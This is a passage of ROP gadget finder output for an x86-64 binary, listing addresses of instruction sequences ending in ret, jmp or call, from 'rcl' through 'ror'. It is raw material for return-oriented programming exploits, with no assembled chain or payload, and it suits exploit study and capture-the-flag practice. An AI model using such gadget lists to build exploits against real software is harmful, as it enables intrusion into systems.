0x00000000004153cb : rcl al, 0x32 ; insb byte ptr [rdi], dx ; add byte ptr [rax + 0x39], cl ; ret
0x000000000042a3ab : rcl dword ptr [rax], 1 ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x00000000004afa5f : rcl dword ptr [rsi + 0x5a], cl ; je 0x4afa2d ; ret 0xacfc
0x00000000004afa5b : rcpps xmm2, xmmword ptr [rdx + 0x5a56d373] ; je 0x4afa31 ; ret 0xacfc
0x000000000049b688 : rcr bl, 1 ; stc ; call rax
0x0000000000479d53 : rcr byte ptr [rbp + 0x41], 0x5c ; pop r13 ; pop r14 ; ret
0x000000000040c740 : rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x0000000000416f71 : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; pop r13 ; ret
0x000000000046cb6f : rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x000000000048b067 : rcr byte ptr [rbp + 0x5b], 1 ; ret
0x0000000000456672 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; pop r14 ; ret
0x000000000041b26c : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; pop r13 ; ret
0x0000000000415606 : rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x0000000000493f98 : rcr byte ptr [rbx + 0x5d], 0xc3 ; nop dword ptr [rax] ; ret
0x000000000041701a : rcr byte ptr [rbx + 0x5d], 1 ; pop r12 ; pop r13 ; ret
0x00000000004169b2 : rcr byte ptr [rbx + 0x5d], 1 ; ret
0x00000000004afe7d : rcr byte ptr [rdi + 0x6d], cl ; test eax, 0x7d4c8c5d ; ret 0xd8f
0x000000000049b154 : rcr byte ptr [rdx], 1 ; stc ; push rax ; sbb edi, ecx ; call qword ptr [rax]
0x00000000004bbd40 : rcr ch, 1 ; cld ; jmp qword ptr [rcx]
0x000000000049b684 : rcr cl, 1 ; stc ; call rax
0x0000000000489319 : rcr dword ptr [rcx], -0x40 ; and eax, 2 ; sub eax, 1 ; ret
0x000000000044d9c4 : rep movsb byte ptr [rdi], byte ptr [rsi] ; cld ; ret
0x000000000044d9b6 : rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000400dc5 : rep movsq qword ptr [rdi], qword ptr [rsi] ; nop ; leave ; ret
0x000000000044e6ea : rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x00000000004257b1 : rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x000000000040041b : ret
0x00000000004006f7 : ret 0
0x00000000004a64e0 : ret 0x10
0x00000000004821ca : ret 0x101
0x0000000000406ed8 : ret 0x109
0x000000000048b03c : ret 0x114d
0x000000000045e734 : ret 0x1176
0x000000000048673c : ret 0x1272
0x00000000004832d3 : ret 0x13e9
0x0000000000491801 : ret 0x145
0x000000000048a4e6 : ret 0x1474
0x000000000047fd68 : ret 0x1475
0x000000000047c541 : ret 0x1477
0x000000000044ca98 : ret 0x148
0x000000000040b134 : ret 0x149
0x000000000043f55f : ret 0x14d
0x00000000004119ba : ret 0x151
0x0000000000410bba : ret 0x15f
0x0000000000472df1 : ret 0x1674
0x000000000044fefe : ret 0x16e9
0x000000000042dc8a : ret 0x17
0x0000000000432336 : ret 0x1776
0x0000000000411422 : ret 0x18
0x000000000043f49c : ret 0x180f
0x0000000000431ec5 : ret 0x1876
0x000000000040d4ba : ret 0x196
0x000000000045e72b : ret 0x1a72
0x00000000004b03da : ret 0x1ad4
0x000000000040e5e2 : ret 0x1b
0x00000000004aeb6d : ret 0x1b49
0x0000000000401690 : ret 0x1b8
0x000000000040adba : ret 0x1bd
0x00000000004958cf : ret 0x1be8
0x000000000042b15a : ret 0x1c6
0x00000000004638a9 : ret 0x1ce9
0x00000000004a81b0 : ret 0x1d4
0x00000000004a8948 : ret 0x1d5
0x0000000000407561 : ret 0x1d89
0x000000000046ce1a : ret 0x1e4
0x00000000004154c2 : ret 0x1f0f
0x00000000004254d6 : ret 0x1f77
0x0000000000460b1d : ret 0x1fe9
0x00000000004022d3 : ret 0x200
0x000000000047e8eb : ret 0x2041
0x00000000004509bc : ret 0x2044
0x0000000000468847 : ret 0x20be
0x00000000004023f2 : ret 0x2141
0x000000000049176b : ret 0x2148
0x000000000041a33d : ret 0x214c
0x00000000004198cc : ret 0x2175
0x0000000000498921 : ret 0x22
0x00000000004854d8 : ret 0x2275
0x0000000000447808 : ret 0x2288
0x000000000042b26a : ret 0x22a
0x00000000004975d2 : ret 0x22b4
0x0000000000487e44 : ret 0x23
0x00000000004342a2 : ret 0x2373
0x000000000048b6da : ret 0x2389
0x00000000004a71b8 : ret 0x24
0x000000000047fdea : ret 0x2410
0x000000000041ca7d : ret 0x2501
0x000000000046def4 : ret 0x2504
0x000000000042a183 : ret 0x2575
0x0000000000493201 : ret 0x25e9
0x000000000045486a : ret 0x26f5
0x00000000004542a2 : ret 0x26fb
0x000000000047a446 : ret 0x2774
0x0000000000435a76 : ret 0x280f
0x0000000000431eb5 : ret 0x2876
0x0000000000485557 : ret 0x28f5
0x0000000000425631 : ret 0x29
0x000000000046a04e : ret 0x290f
0x0000000000401953 : ret 0x2944
0x00000000004019d3 : ret 0x2948
0x000000000046cf8a : ret 0x2949
0x00000000004159d0 : ret 0x294c
0x0000000000419bad : ret 0x294d
0x0000000000416ab2 : ret 0x2a
0x00000000004208da : ret 0x2a17
0x0000000000427c6a : ret 0x2ab
0x00000000004152aa : ret 0x2af8
0x0000000000407bbf : ret 0x2b
0x000000000041746a : ret 0x2b48
0x00000000004298ab : ret 0x2b74
0x00000000004257f2 : ret 0x2b75
0x000000000044eb62 : ret 0x2b77
0x00000000004009e5 : ret 0x2b8
0x000000000040a9de : ret 0x2b8e
0x00000000004081ba : ret 0x2bb1
0x00000000004931ef : ret 0x2be9
0x0000000000416676 : ret 0x2c20
0x000000000042603e : ret 0x2c75
0x0000000000424e6a : ret 0x2d9
0x0000000000475d65 : ret 0x2e66
0x0000000000452d7e : ret 0x2f75
0x000000000046eab5 : ret 0x30be
0x000000000046160a : ret 0x30e8
0x0000000000406cc9 : ret 0x3141
0x000000000046bdde : ret 0x32c8
0x00000000004a76a8 : ret 0x33
0x0000000000459594 : ret 0x349
0x00000000004915a0 : ret 0x3575
0x0000000000481e9a : ret 0x3774
0x0000000000432316 : ret 0x3776
0x00000000004afcba : ret 0x3827
0x0000000000476bee : ret 0x3873
0x0000000000431ea5 : ret 0x3876
0x000000000041d52b : ret 0x389
0x00000000004ae346 : ret 0x38ae
0x0000000000494eb2 : ret 0x38e8
0x0000000000490178 : ret 0x3901
0x0000000000487c5d : ret 0x3934
0x00000000004743af : ret 0x3941
0x0000000000417d11 : ret 0x3948
0x0000000000418acd : ret 0x3949
0x000000000042591c : ret 0x394c
0x000000000046fa5d : ret 0x394d
0x00000000004034a1 : ret 0x3956
0x000000000044d112 : ret 0x3a01
0x000000000043428b : ret 0x3a73
0x000000000048ecc3 : ret 0x3a83
0x000000000044dbb5 : ret 0x3b48
0x000000000045069f : ret 0x3b8
0x000000000041ab29 : ret 0x3c75
0x0000000000487c1d : ret 0x3d
0x000000000041526a : ret 0x3d5
0x0000000000485ec8 : ret 0x3d73
0x00000000004270f1 : ret 0x3d83
0x000000000042344f : ret 0x3de9
0x0000000000481cfa : ret 0x3e80
0x000000000045f3d6 : ret 0x3ef
0x0000000000460f2b : ret 0x4002
0x0000000000413bad : ret 0x4074
0x000000000047aa31 : ret 0x408d
0x0000000000452fca : ret 0x4101
0x0000000000467118 : ret 0x4108
0x0000000000407308 : ret 0x410a
0x0000000000407125 : ret 0x410b
0x0000000000406cc3 : ret 0x410c
0x00000000004678cd : ret 0x4110
0x00000000004880f6 : ret 0x4118
0x0000000000487c97 : ret 0x4134
0x0000000000459d47 : ret 0x415f
0x00000000004577ae : ret 0x41c3
0x000000000042c90a : ret 0x4266
0x00000000004020a6 : ret 0x4388
0x00000000004776c3 : ret 0x4389
0x000000000040c711 : ret 0x4401
0x000000000046f30b : ret 0x4404
0x0000000000488476 : ret 0x4418
0x0000000000420e2b : ret 0x4466
0x00000000004247c3 : ret 0x4473
0x00000000004020db : ret 0x4588
0x00000000004012cd : ret 0x458b
0x0000000000487965 : ret 0x45e8
0x00000000004aee44 : ret 0x474c
0x000000000045510b : ret 0x475
0x000000000042a926 : ret 0x4801
0x0000000000418cc6 : ret 0x4803
0x0000000000429191 : ret 0x4804
0x000000000040116a : ret 0x4808
0x00000000004098d6 : ret 0x480a
0x0000000000422e68 : ret 0x4810
0x000000000045f4dc : ret 0x4811
0x0000000000464817 : ret 0x481e
0x0000000000464837 : ret 0x4820
0x0000000000454f5e : ret 0x4830
0x000000000042c816 : ret 0x4840
0x0000000000447448 : ret 0x48c3
0x000000000045461f : ret 0x48e
0x000000000041f843 : ret 0x48e9
0x00000000004b0606 : ret 0x48f
0x0000000000404b46 : ret 0x49
0x000000000040c6ac : ret 0x4901
0x000000000045c1eb : ret 0x4902
0x000000000041fe82 : ret 0x4908
0x0000000000430ddc : ret 0x4910
0x00000000004522d6 : ret 0x4aa
0x0000000000461379 : ret 0x4c01
0x000000000042516a : ret 0x4c07
0x00000000004640d6 : ret 0x4c40
0x000000000046cdce : ret 0x4ce8
0x0000000000405ab8 : ret 0x4d
0x0000000000423e26 : ret 0x4d01
0x0000000000462b98 : ret 0x4d10
0x0000000000408fdf : ret 0x4de8
0x00000000004b0067 : ret 0x4e27
0x000000000040800e : ret 0x4f76
0x0000000000455aef : ret 0x5089
0x0000000000452be7 : ret 0x508b
0x00000000004838ea : ret 0x50e8
0x0000000000434274 : ret 0x5173
0x00000000004035cb : ret 0x51a3
0x00000000004508f7 : ret 0x5488
0x00000000004ae2cc : ret 0x5508
0x000000000047878e : ret 0x5590
0x00000000004322f6 : ret 0x5776
0x00000000004b0598 : ret 0x5803
0x000000000045c251 : ret 0x5841
0x000000000048e635 : ret 0x5876
0x0000000000415003 : ret 0x589
0x00000000004adfa0 : ret 0x591c
0x00000000004aed07 : ret 0x5ae4
0x000000000042ae4e : ret 0x5ae9
0x000000000045c439 : ret 0x5be9
0x0000000000415d0a : ret 0x5d5b
0x000000000040167d : ret 0x6175
0x00000000004b0a32 : ret 0x62c1
0x0000000000483140 : ret 0x6349
0x000000000048be54 : ret 0x637f
0x000000000045f4b3 : ret 0x6411
0x00000000004012bf : ret 0x6588
0x0000000000462091 : ret 0x6601
0x0000000000431e31 : ret 0x6620
0x000000000042a2f8 : ret 0x66c3
0x000000000048674e : ret 0x674
0x00000000004322e6 : ret 0x6776
0x00000000004adfbf : ret 0x67b2
0x000000000041dad5 : ret 0x6874
0x000000000044ffaa : ret 0x6ae9
0x00000000004b0bc1 : ret 0x6f9
0x000000000046568a : ret 0x73
0x000000000041dc51 : ret 0x7401
0x000000000042915a : ret 0x7402
0x00000000004831aa : ret 0x7403
0x0000000000451021 : ret 0x7404
0x0000000000478562 : ret 0x7408
0x00000000004193dd : ret 0x7420
0x000000000046afa4 : ret 0x7450
0x000000000048795a : ret 0x7472
0x000000000044b679 : ret 0x7501
0x000000000044b686 : ret 0x7502
0x000000000044b693 : ret 0x7504
0x000000000042547d : ret 0x7508
0x000000000044b64b : ret 0x7510
0x000000000044b658 : ret 0x7520
0x000000000042b17e : ret 0x7540
0x000000000047c4a0 : ret 0x7577
0x0000000000433162 : ret 0x7677
0x00000000004895d2 : ret 0x777
0x00000000004227ae : ret 0x778
0x000000000048ae96 : ret 0x77f
0x0000000000421c7b : ret 0x784
0x0000000000409731 : ret 0x7ce9
0x0000000000431dd1 : ret 0x7e20
0x000000000043224c : ret 0x7e40
0x000000000042b4bc : ret 0x7f10
0x00000000004745b8 : ret 0x7f3c
0x0000000000439a3e : ret 0x80
0x000000000042c699 : ret 0x8000
0x0000000000494b72 : ret 0x8001
0x000000000047d8ee : ret 0x8116
0x00000000004668eb : ret 0x8148
0x00000000004950c8 : ret 0x8166
0x0000000000423b50 : ret 0x820f
0x000000000045ba73 : ret 0x8301
0x0000000000483ec7 : ret 0x8303
0x0000000000432d30 : ret 0x830f
0x00000000004646e4 : ret 0x8341
0x000000000042a235 : ret 0x8348
0x000000000044d590 : ret 0x8349
0x0000000000485d3f : ret 0x8364
0x0000000000477ea6 : ret 0x840
0x000000000047c899 : ret 0x8401
0x0000000000418ad5 : ret 0x840f
0x000000000045a7c0 : ret 0x841
0x0000000000491e1e : ret 0x8440
0x00000000004808e7 : ret 0x848b
0x0000000000475a09 : ret 0x8502
0x0000000000419c62 : ret 0x850f
0x000000000045ee13 : ret 0x8511
0x0000000000451352 : ret 0x8545
0x00000000004094b2 : ret 0x8548
0x000000000047da0c : ret 0x8549
0x000000000042a1aa : ret 0x854d
0x000000000040c581 : ret 0x8575
0x00000000004035aa : ret 0x8581
0x0000000000407d42 : ret 0x860f
0x000000000042180f : ret 0x870f
0x00000000004ad8de : ret 0x871e
0x00000000004745bf : ret 0x875
0x0000000000431ed5 : ret 0x876
0x00000000004095dc : ret 0x8801
0x0000000000458abd : ret 0x8804
0x00000000004620e2 : ret 0x8841
0x0000000000484e2e : ret 0x8844
0x0000000000408dca : ret 0x8901
0x0000000000453a7e : ret 0x8902
0x0000000000418f5a : ret 0x8908
0x00000000004646d6 : ret 0x8941
0x00000000004260df : ret 0x8944
0x000000000040128f : ret 0x8948
0x000000000041a18a : ret 0x8949
0x0000000000417781 : ret 0x894c
0x000000000048a04b : ret 0x894e
0x000000000041e0ba : ret 0x8a
0x000000000048e860 : ret 0x8b
0x0000000000457389 : ret 0x8b01
0x000000000047605a : ret 0x8b04
0x000000000047c633 : ret 0x8b05
0x0000000000475f0b : ret 0x8b08
0x00000000004b010e : ret 0x8b36
0x0000000000424031 : ret 0x8b41
0x00000000004745eb : ret 0x8b44
0x000000000041a5b3 : ret 0x8b48
0x0000000000417f36 : ret 0x8b49
0x0000000000489fce : ret 0x8b4a
0x0000000000413dbd : ret 0x8b4c
0x000000000046b80d : ret 0x8c0f
0x0000000000464131 : ret 0x8d04
0x000000000049301f : ret 0x8d0f
0x000000000040712b : ret 0x8d42
0x000000000042372c : ret 0x8d44
0x0000000000420321 : ret 0x8d48
0x000000000046ecec : ret 0x8d49
0x0000000000489377 : ret 0x8d4a
0x0000000000424844 : ret 0x8d4c
0x00000000004646f2 : ret 0x8d89
0x000000000045958b : ret 0x8e0f
0x000000000046499a : ret 0x8f0f
0x0000000000446c15 : ret 0x90c3
0x000000000042a8c9 : ret 0x90e9
0x000000000047e9ae : ret 0x9174
0x0000000000491c5b : ret 0x9272
0x0000000000421b2d : ret 0x948
0x000000000047a008 : ret 0x94c
0x000000000048b882 : ret 0x950f
0x000000000044f930 : ret 0x9572
0x00000000004aef33 : ret 0x9576
0x00000000004672ef : ret 0x958b
0x00000000004290ee : ret 0x976
0x00000000004879a0 : ret 0x9ae8
0x0000000000483c73 : ret 0x9be9
0x000000000040055a : ret 0x9d2
0x000000000048dd45 : ret 0x9eb
0x00000000004a5ce0 : ret 0xa
0x00000000004b618e : ret 0xa01
0x0000000000451048 : ret 0xa076
0x000000000044fe74 : ret 0xa0e9
0x000000000046a077 : ret 0xa3e8
0x00000000004930de : ret 0xa4e9
0x00000000004aec23 : ret 0xa514
0x00000000004931dd : ret 0xa5e9
0x0000000000451fed : ret 0xabe
0x00000000004af0a7 : ret 0xac65
0x00000000004afa64 : ret 0xacfc
0x000000000046612f : ret 0xae9
0x0000000000429fea : ret 0xaeeb
0x00000000004b377f : ret 0xb00e
0x000000000041839d : ret 0xb074
0x0000000000421b8b : ret 0xb277
0x000000000045d01b : ret 0xb2eb
0x000000000044fe60 : ret 0xb4e9
0x0000000000464716 : ret 0xb589
0x0000000000490b55 : ret 0xb5e8
0x0000000000409595 : ret 0xb60f
0x0000000000407854 : ret 0xb70f
0x0000000000470955 : ret 0xb8
0x00000000004726fc : ret 0xb848
0x0000000000494f32 : ret 0xb8e8
0x00000000004aef6e : ret 0xb9b9
0x0000000000473f35 : ret 0xb9e9
0x0000000000475ae4 : ret 0xba41
0x0000000000429823 : ret 0xbae9
0x000000000045d152 : ret 0xbaeb
0x0000000000493696 : ret 0xbc80
0x0000000000464702 : ret 0xbd89
0x000000000046b74d : ret 0xbde8
0x0000000000487aa2 : ret 0xbe0f
0x00000000004aecc4 : ret 0xbe57
0x000000000042c559 : ret 0xc000
0x0000000000409ac6 : ret 0xc031
0x000000000045f4fe : ret 0xc083
0x0000000000431c90 : ret 0xc085
0x0000000000401442 : ret 0xc101
0x00000000004016fb : ret 0xc141
0x000000000047b069 : ret 0xc148
0x0000000000421ca9 : ret 0xc183
0x000000000040b268 : ret 0xc189
0x0000000000450ce2 : ret 0xc221
0x000000000042611b : ret 0xc275
0x000000000047d446 : ret 0xc283
0x0000000000434144 : ret 0xc2b2
0x0000000000401e18 : ret 0xc35b
0x000000000045e8ed : ret 0xc389
0x000000000040189d : ret 0xc3f3
0x00000000004ad462 : ret 0xc4c3
0x00000000004ae878 : ret 0xc4ff
0x00000000004322b1 : ret 0xc540
0x000000000045e9b6 : ret 0xc589
0x0000000000469fac : ret 0xc689
0x0000000000485d1d : ret 0xc74
0x000000000040136d : ret 0xc748
0x000000000046fba8 : ret 0xc789
0x0000000000487b32 : ret 0xc829
0x0000000000468982 : ret 0xc839
0x000000000041d51c : ret 0xc883
0x00000000004673c7 : ret 0xc985
0x0000000000475ff3 : ret 0xc9eb
0x0000000000447761 : ret 0xc9ff
0x0000000000400901 : ret 0xca21
0x000000000047eeef : ret 0xcbe9
0x00000000004ae30a : ret 0xcca7
0x00000000004b03ed : ret 0xcd11
0x000000000040ba72 : ret 0xce80
0x00000000004a60e0 : ret 0xd
0x000000000042799e : ret 0xd020
0x0000000000414846 : ret 0xd021
0x000000000046ae2b : ret 0xd120
0x0000000000474959 : ret 0xd1e8
0x0000000000407b74 : ret 0xd284
0x000000000045e4aa : ret 0xd285
0x0000000000495618 : ret 0xd2e8
0x0000000000480976 : ret 0xd348
0x0000000000456467 : ret 0xd5e9
0x0000000000487eef : ret 0xd75
0x0000000000463ad6 : ret 0xd774
0x00000000004afe85 : ret 0xd8f
0x00000000004005bf : ret 0xda80
0x0000000000416963 : ret 0xdaf7
0x000000000045ac9a : ret 0xdb76
0x00000000004aff66 : ret 0xdcd9
0x00000000004aeee2 : ret 0xde5d
0x00000000004adc71 : ret 0xde9e
0x000000000042c419 : ret 0xe000
0x000000000044b609 : ret 0xe074
0x00000000004541d0 : ret 0xe083
0x00000000004bc9fc : ret 0xe0a
0x00000000004932a1 : ret 0xe1e9
0x0000000000454002 : ret 0xe1eb
0x0000000000414450 : ret 0xe281
0x0000000000407595 : ret 0xe283
0x0000000000479d18 : ret 0xe575
0x000000000046c430 : ret 0xe57f
0x000000000046cdaa : ret 0xe583
0x000000000044ebc2 : ret 0xe680
0x000000000046d48f : ret 0xe683
0x00000000004b0086 : ret 0xe71f
0x000000000047fd3a : ret 0xe75
0x00000000004298d6 : ret 0xe775
0x000000000046ca63 : ret 0xe7e9
0x0000000000432915 : ret 0xe883
0x000000000047f8b6 : ret 0xe8c0
0x0000000000402095 : ret 0xe8c1
0x000000000040986a : ret 0xe901
0x00000000004098af : ret 0xe902
0x00000000004477f6 : ret 0xe908
0x0000000000443d96 : ret 0xe910
0x0000000000464f5d : ret 0xe920
0x00000000004ae3e7 : ret 0xe970
0x000000000044eb5a : ret 0xea81
0x000000000041451d : ret 0xeab8
0x00000000004012e6 : ret 0xeac1
0x0000000000484576 : ret 0xeb01
0x0000000000475f23 : ret 0xeb04
0x0000000000430e0a : ret 0xeb10
0x00000000004880e2 : ret 0xeb30
0x0000000000417eba : ret 0xec
0x00000000004b0b98 : ret 0xec2
0x0000000000463a60 : ret 0xed75
0x00000000004b083a : ret 0xef32
0x0000000000492e68 : ret 0xef89
0x000000000047ca7f : ret 0xefeb
0x000000000042fbfe : ret 0xf
0x000000000042c2d9 : ret 0xf000
0x000000000040bf55 : ret 0xf01
0x00000000004214d9 : ret 0xf02
0x00000000004238b9 : ret 0xf04
0x0000000000418623 : ret 0xf08
0x00000000004217a9 : ret 0xf0f
0x0000000000414d4e : ret 0xf10
0x000000000046d2ab : ret 0xf20
0x0000000000423a23 : ret 0xf275
0x000000000046a366 : ret 0xf3f
0x000000000046d833 : ret 0xf40
0x000000000047699d : ret 0xf41
0x000000000049331c : ret 0xf45
0x000000000042a4c9 : ret 0xf475
0x0000000000458346 : ret 0xf48
0x000000000040052d : ret 0xf49
0x000000000046d819 : ret 0xf50
0x00000000004902e6 : ret 0xf608
0x000000000047c0f5 : ret 0xf631
0x000000000042c896 : ret 0xf66
0x00000000004819c7 : ret 0xf675
0x0000000000401457 : ret 0xf74
0x0000000000406edb : ret 0xf741
0x000000000040c1a2 : ret 0xf748
0x00000000004895bc : ret 0xf749
0x000000000048a7ca : ret 0xf75c
0x00000000004876ea : ret 0xf78d
0x000000000042c199 : ret 0xf800
0x00000000004adb50 : ret 0xf869
0x0000000000479302 : ret 0xf871
0x000000000041f253 : ret 0xf8b
0x000000000046a361 : ret 0xf8c1
0x0000000000447076 : ret 0xf8c5
0x000000000044ef04 : ret 0xf8e9
0x0000000000401671 : ret 0xf981
0x0000000000463f6a : ret 0xf9c4
0x000000000049b7d0 : ret 0xfa05
0x000000000049b7d8 : ret 0xfa0b
0x0000000000401665 : ret 0xfa81
0x000000000045bb9a : ret 0xfac8
0x0000000000425e02 : ret 0xfae9
0x00000000004263ea : ret 0xfbe9
0x000000000042c059 : ret 0xfc00
0x000000000042af71 : ret 0xfc3
0x000000000042bf19 : ret 0xfe00
0x000000000041d9ea : ret 0xfe2a
0x00000000004076c5 : ret 0xfe83
0x00000000004296fa : ret 0xfed1
0x000000000042bdd9 : ret 0xff00
0x000000000043b5b1 : ret 0xff2
0x000000000045417b : ret 0xff25
0x0000000000432ad9 : ret 0xff2d
0x000000000042c83a : ret 0xff3
0x0000000000471a57 : ret 0xff31
0x0000000000421d5a : ret 0xff45
0x000000000042bc99 : ret 0xff80
0x000000000046d031 : ret 0xff83
0x000000000045ac2c : ret 0xff85
0x00000000004640c2 : ret 0xffa0
0x000000000042a17a : ret 0xffa5
0x00000000004119fa : ret 0xffaf
0x00000000004116fa : ret 0xffb2
0x0000000000417a37 : ret 0xffb8
0x000000000041456a : ret 0xffc0
0x000000000048c93a : ret 0xffc7
0x0000000000429e88 : ret 0xffdf
0x00000000004617b0 : ret 0xffe0
0x0000000000468e9e : ret 0xffe6
0x000000000046ecc9 : ret 0xffe8
0x000000000044ff15 : ret 0xffe9
0x0000000000415a31 : ret 0xffef
0x00000000004298a2 : ret 0xfff
0x0000000000414392 : ret 0xfff0
0x0000000000471440 : ret 0xfff1
0x000000000042b799 : ret 0xfff8
0x000000000049b6a9 : ret 0xfff9
0x0000000000423358 : ret 0xfffa
0x000000000040b189 : ret 0xfffb
0x000000000042b659 : ret 0xfffc
0x000000000041ecd5 : ret 0xfffd
0x000000000042831a : ret 0xfffe
0x000000000041c1cc : ret 0xffff
0x000000000040188b : ret 1
0x000000000043254b : ret 2
0x0000000000416585 : ret 3
0x0000000000410858 : ret 4
0x000000000045c8ca : ret 5
0x00000000004a5888 : ret 6
0x000000000043139a : ret 7
0x00000000004108b8 : ret 8
0x000000000044c0ba : ret 9
0x00000000004723e0 : retf 0x24 ; jmp rax
0x0000000000475d5d : retf 0x9066 ; or byte ptr [rbx + 0xc], 0x40 ; jmp 0x475d30
0x000000000049b6c1 : retf 0xfff9 ; or bl, 0xf9 ; call rax
0x00000000004948b3 : retf ; mov rsi, qword ptr [r14] ; call r12
0x000000000049b6c5 : retf ; stc ; call rax
0x000000000044d1d5 : rol bl, 0x48 ; mov eax, edi ; ret
0x000000000044ecc3 : rol bl, 0x48 ; mov eax, edx ; pop rbx ; ret
0x0000000000494cec : rol bl, 0x66 ; nop ; mov rax, qword ptr [rsi + 8] ; ret
0x0000000000431e2e : rol bl, 0x83 ; ret 0x6620
0x000000000047b26b : rol bl, 0xb8 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x000000000041ee37 : rol bl, 1 ; mov eax, 0xffffffff ; ret
0x00000000004325fd : rol bl, 1 ; nop ; xor eax, eax ; ret
0x000000000044db7d : rol byte ptr [r9 + 0xf], 1 ; adc dword ptr [rbx], esp ; ret
0x000000000042c812 : rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x000000000043231b : rol byte ptr [rax + 0x48], 1 ; clc ; vzeroupper ; ret
0x000000000047a442 : rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x00000000004a9b80 : rol byte ptr [rax + rax], 0 ; ret 4
0x00000000004808e1 : rol byte ptr [rax], 0 ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x000000000043306d : rol byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x0000000000453a8b : rol byte ptr [rax], 0 ; add dh, dh ; ret 0x7404
0x0000000000493d1e : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x0000000000416489 : rol byte ptr [rax], 1 ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000432072 : rol byte ptr [rbp + 0x664975c0], 0xf ; xlatb ; ret 0xc085
0x000000000049c1dc : rol byte ptr [rbp - 0x788f0006], 1 ; cli ; call qword ptr [rax]
0x000000000048931b : rol byte ptr [rbx - 0x177cfd20], 1 ; ret
0x000000000041f2a8 : rol byte ptr [rbx - 0x6af00002], 0xc0 ; neg eax ; ret
0x0000000000459d41 : rol byte ptr [rbx - 0x76befb08], 1 ; ret 0x415f
0x000000000049c158 : rol byte ptr [rbx - 6], 1 ; jmp rax
0x000000000047b4d2 : rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x000000000044eb51 : rol byte ptr [rcx + 0xbeff], cl ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000046d27f : rol byte ptr [rcx + 0xf], 0x94 ; ret
0x000000000044db7e : rol byte ptr [rcx + 0xf], 1 ; adc dword ptr [rbx], esp ; ret
0x0000000000473f32 : rol byte ptr [rcx - 0x77], 1 ; ret 0xb9e9
0x000000000049c154 : rol byte ptr [rcx - 6], 0xff ; rol byte ptr [rbx - 6], 1 ; jmp rax
0x000000000047b4b2 : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x0000000000455436 : rol byte ptr [rcx], 0x50 ; call rbx
0x000000000045fffb : rol byte ptr [rcx], 0x83 ; ret 0x4801
0x000000000044eee7 : rol byte ptr [rcx], 0x83 ; ret 0xf01
0x000000000044ef00 : rol byte ptr [rcx], 0xf ; scasd eax, dword ptr [rdi] ; ret 0xf8e9
0x000000000042a36b : rol byte ptr [rcx], 1 ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000454c71 : rol byte ptr [rcx], 1 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000047b512 : rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x000000000047b4c2 : rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x000000000047b502 : rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x000000000043239f : rol ch, 1 ; std ; xlatb ; ret
0x000000000047a1b6 : rol ch, cl ; std ; xlatb ; ret
0x000000000044770f : rol ch, cl ; std ; xlatb ; ret 0xc085
0x00000000004ad460 : rol cl, 0xc2 ; ret
0x000000000049b6e8 : rol dl, 0xf9 ; call qword ptr [rax]
0x000000000047b45c : rol dword ptr [rax + 0x1e740fe1], 1 ; ret
0x0000000000431e54 : rol dword ptr [rbp + 0x315775c0], -0x40 ; ret
0x0000000000432393 : rol dword ptr [rbp - 0x3a378a40], -3 ; xlatb ; ret 0xc085
0x00000000004471e3 : rol dword ptr [rbp - 0x3a678a40], -3 ; xlatb ; ret 0xc085
0x0000000000400969 : rol dword ptr [rcx], -0x73 ; call r11
0x000000000047eb99 : rol dword ptr [rcx], 0 ; add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x000000000045d4ef : rol dword ptr [rcx], 0xf ; mov dh, 0x41 ; dec dword ptr [rax - 0x7d] ; ret 0x8801
0x000000000045b5aa : rol dword ptr [rdx], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000432ad5 : rol ebp, 1 ; stc ; xlatb ; ret 0xff2d
0x000000000042986c : rol ebx, 0x66 ; nop ; xor eax, eax ; ret
0x000000000042986b : rol r11d, 0x66 ; nop ; xor eax, eax ; ret
0x000000000049b6c8 : ror ah, 1 ; stc ; jmp qword ptr [rax]
0x0000000000478e65 : ror byte ptr [r9 + rcx*4 - 1], 0x41 ; call rsp
0x0000000000491588 : ror byte ptr [rax + 0x21], cl ; ret 0xc148
0x0000000000431ea2 : ror byte ptr [rax + 0x29], 0xc2 ; jbe 0x431ee9 ; add rax, rdi ; ret
0x00000000004475a7 : ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x000000000047b17c : ror byte ptr [rax + 0x29], 1 ; clc ; shr rax, 2 ; ret
0x0000000000417bee : ror byte ptr [rax + 0x29], 1 ; ret
0x000000000047c54c : ror byte ptr [rax + 0x39], 0xd7 ; ja 0x47c57f ; ret
0x0000000000452828 : ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x00000000004246f3 : ror byte ptr [rax + 0x39], 1 ; ret
0x000000000048346a : ror byte ptr [rax + 0x39], cl ; ret
0x0000000000476bf3 : ror byte ptr [rax + 0x39], cl ; ret 0xf48
0x000000000045412d : ror byte ptr [rax + 0x63], cl ; test dword ptr [rax], r8d ; add rax, rbp ; jmp rax
0x0000000000485396 : ror byte ptr [rax + 0xf], 0x44 ; enter -0x76b8, -0x38 ; ret
